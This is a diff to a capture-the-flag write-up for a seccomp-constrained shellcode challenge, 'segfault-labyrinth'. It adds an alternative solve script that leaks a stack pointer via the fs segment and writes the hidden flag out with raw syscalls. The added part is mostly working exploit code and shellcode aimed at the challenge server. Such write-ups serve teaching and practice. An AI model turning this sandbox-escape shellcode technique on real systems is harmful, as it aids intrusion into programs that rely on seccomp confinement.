@@ -15,6 +15,8 @@ Tags: _rev_ _pwn_ _shellcode_ _x86-64_ _seccomp_
 
 Basic seccomp constrained shellcode runner where the flag is randomly located [in RAM] and you've got to find it.
 
+> UPDATE: See end for alternatives.
+
 
 ## Analysis
 
@@ -391,4 +393,45 @@ p.close()
 print(_)
 ```
 
-If `write` were the only option, or if the memory was `r--` (`stat` would fail to write), then this or my original solve is your best bet.
+If `write` were the only option, or if the memory was `r--` (`stat` would fail to write), then this or my original solve is your best bet, however ...
+
+### Leak Stack Alternative (portable and consistent) `exploit4.py`
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+binary = context.binary = ELF('./challenge', checksec=False)
+
+if args.REMOTE:
+    p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
+else:
+    p = process(binary.path)
+
+shellcode = asm(f'''
+mov rsi, qword ptr [fs:0 + 0x300]
+mov rsi, qword ptr [rsi - 0x2f0]
+mov rdi, 1
+mov rdx, 100
+mov eax, {constants.SYS_write}
+syscall
+xor rdi, rdi
+mov eax, {constants.SYS_exit}
+syscall
+''')
+
+if args.D: print(disasm(shellcode))
+assert(len(shellcode) < 0x1000)
+p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
+p.send(shellcode)
+_ = p.recvline().decode().strip()
+p.close()
+print(_)
+```
+
+Get a stack leak from `fs:0 + 0x300`, then the offset to the flag pointer (use GDB to figure it out).
+
+> I did not need to match libc versions.
+> 
+> I didn't try this approach at first since I knew exactly what would work (dump 16 predictable `rand()` locations).
